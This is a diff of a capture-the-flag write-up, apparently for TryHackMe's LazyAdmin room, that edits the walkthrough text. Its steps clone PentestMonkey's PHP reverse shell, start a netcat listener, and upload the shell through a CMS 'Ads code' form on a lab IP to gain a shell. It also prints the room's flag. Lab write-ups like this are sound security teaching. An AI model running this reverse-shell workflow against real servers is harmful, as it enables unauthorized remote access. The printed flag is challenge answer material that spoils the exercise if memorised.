@@ -256,11 +256,11 @@ DOWNLOADED: 13836 - FOUND: 4
 
 # Vulnerability Exploitation
 > PHP Reverse Shell
-11. `git clone https://github.com/pentestmonkey/php-reverse-shell`
-12. `ls`
-13. `cd php-reverse-shell`
-14. `ls`
-15. `mousepad php-reverse-shell.php`
+15. `git clone https://github.com/pentestmonkey/php-reverse-shell` to download a copy of PentestMonkey's PHP Reverse Shell Github repository onto my local machine
+16. `ls` to verify that the repository was successfully copied onto my local machine, which it has
+17. `cd php-reverse-shell` to change into the downloaded Github repository
+18. `ls` to list the contents of the repository
+19. `mousepad php-reverse-shell.php` to laucnh the Mousepad text editor and open the **php-reverse-shell.php** file
 ```bash
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ git clone https://github.com/pentestmonkey/php-reverse-shell
@@ -297,13 +297,12 @@ CHANGELOG  COPYING.GPL  COPYING.PHP-REVERSE-SHELL  LICENSE  php-reverse-shell.ph
 └─$ nc -lvnp 9999                            
 listening on [any] 9999 ...
 ```
-17 `firefox "http://10.10.165.242/content/as/?type=ad"`
-![]()
-18. Copy paste the contents of **php-reverse-shell.php** into the "**Ads code**" input form and give it any name you want
-![]()
-19. `firefox "http://10.10.165.242/content/inc/ads/"`
-![]()
-20. Click on it
+17 `firefox "http://10.10.165.242/content/as/?type=ad"` Copy paste the contents of **php-reverse-shell.php** into the "**Ads code**" input form and give it any name you want
+
+![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20LazyAdmin/Reverse%20Shell%20Ad%20.png)
+19. `firefox "http://10.10.165.242/content/inc/ads/"` and click on it
+
+![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20LazyAdmin/PHP%20Reverse%20Shell%20Uploaded.png)
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ nc -lvnp 9999                            
@@ -439,6 +438,7 @@ THM{6637f41d0177b6f37cb20d775124699f}
 ```
 
 **Room completed!**
+
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/TryHackMe%20-%20LazyAdmin.png)
 
 # Command History
